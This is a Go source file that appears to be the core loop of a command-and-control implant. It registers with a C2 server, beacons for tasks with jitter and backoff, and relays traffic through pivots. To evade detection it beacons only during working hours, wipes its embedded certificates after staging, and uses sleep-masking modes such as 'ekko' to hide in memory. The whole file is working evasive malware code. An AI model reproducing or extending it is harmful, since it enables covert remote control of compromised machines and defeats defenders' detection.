package agent

import (
	"math/rand"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

const (
	maxBackoff     = 5 * time.Minute
	failsToBackoff = 3
)

type beaconState struct {
	mu               sync.Mutex
	sleepSec         int
	jitterPct        int
	consecutiveFails int
}

func (b *beaconState) set(sec, jitter int) {
	b.mu.Lock()
	b.sleepSec = sec
	b.jitterPct = jitter
	b.mu.Unlock()
}

func (b *beaconState) next() time.Duration {
	b.mu.Lock()
	sec := b.sleepSec
	jitter := b.jitterPct
	fails := b.consecutiveFails
	b.mu.Unlock()

	base := float64(sec)
	variance := base * float64(jitter) / 100.0
	delta := (rand.Float64()*2 - 1) * variance
	d := time.Duration(base+delta) * time.Second
	if d < time.Second {
		d = time.Second
	}
	if fails >= failsToBackoff {
		shift := uint(fails - failsToBackoff)
		if shift > 62 {
			shift = 62 // prevent int64 overflow in time.Duration multiplication
		}
		exp := time.Duration(1<<shift) * d
		if exp > maxBackoff || exp < 0 {
			exp = maxBackoff
		}
		return exp
	}
	return d
}

func (b *beaconState) fail() {
	b.mu.Lock()
	b.consecutiveFails++
	b.mu.Unlock()
}

func (b *beaconState) ok() {
	b.mu.Lock()
	b.consecutiveFails = 0
	b.mu.Unlock()
}

func (b *beaconState) fails() int {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.consecutiveFails
}

// parseHHMM parses "HH:MM" and returns minutes since midnight.
func parseHHMM(s string) int {
	s = strings.TrimSpace(s)
	parts := strings.SplitN(s, ":", 2)
	if len(parts) != 2 {
		return 0
	}
	h, _ := strconv.Atoi(parts[0])
	m, _ := strconv.Atoi(parts[1])
	return h*60 + m
}

// inWorkingHours returns true if the current time is within the configured window.
// WorkingHours format: "09:00-17:00". Empty = always true.
func inWorkingHours() bool {
	if WorkingHours == "" {
		return true
	}
	parts := strings.SplitN(WorkingHours, "-", 2)
	if len(parts) != 2 {
		return true
	}
	start := parseHHMM(parts[0])
	end := parseHHMM(parts[1])
	now := time.Now()
	cur := now.Hour()*60 + now.Minute()
	if start <= end {
		return cur >= start && cur < end
	}
	// Overnight window (e.g. "22:00-06:00")
	return cur >= start || cur < end
}

// sleepUntilWorkHours sleeps until the start of the working hours window.
func sleepUntilWorkHours() {
	parts := strings.SplitN(WorkingHours, "-", 2)
	if len(parts) != 2 {
		time.Sleep(time.Minute)
		return
	}
	start := parseHHMM(parts[0])
	now := time.Now()
	cur := now.Hour()*60 + now.Minute()
	var waitMin int
	if cur < start {
		waitMin = start - cur
	} else {
		waitMin = (24*60 - cur) + start
	}
	if waitMin <= 0 {
		waitMin = 1
	}
	time.Sleep(time.Duration(waitMin) * time.Minute)
}

// activeTransport is the agent's active C2 transport.
// Pivot features (pipe_server, http_pivot) use it for N-hop relay via rawForwarder.
var activeTransport transport

func Run(t transport) {
	activeTransport = t
	sleepSec, jitterPct := parseSleepConfig()
	state := &beaconState{sleepSec: sleepSec, jitterPct: jitterPct}
	updateSleep = state.set

	info := getSysInfo()

	for {
		if err := t.register(info); err != nil {
			state.fail()
			time.Sleep(state.next())
			continue
		}
		// Expose our agent ID so pivots can set parent_id for child agents
		if id, ok := t.(interface{ agentIDStr() string }); ok {
			GlobalAgentID = id.agentIDStr()
		}
		state.ok()
		if StageCleanup == "true" {
			AgentCertPEM = ""
			AgentKeyPEM  = ""
			CACertPEM    = ""
		}
		break
	}

	for {
		if !inWorkingHours() {
			sleepUntilWorkHours()
			continue
		}

		tasks, err := t.beacon()
		if err != nil {
			state.fail()
			if MaxRetry != "0" {
				if n, _ := strconv.Atoi(MaxRetry); n > 0 && state.fails() >= n {
					os.Exit(0)
				}
			}
		} else {
			state.ok()
			for _, task := range tasks {
				go dispatchTask(t, task)
			}
		}
		d := state.next()
		// Use sleep masking to hide during the beacon sleep interval.
		// "none" skips masking entirely; used when task goroutines must
		// call sendResult concurrently (sleep mask scrambles the AES key
		// in-place, racing with any in-flight seal/open calls).
		switch SleepMaskMode {
		case "none", "off", "plain":
			time.Sleep(d)
		case "noaccess":
			sleepMaskNoAccess(uint32(d.Milliseconds()))
		case "ekko":
			sleepMaskEkko(uint32(d.Milliseconds()))
		default:
			sleepMask(uint32(d.Milliseconds()))
		}
	}
}
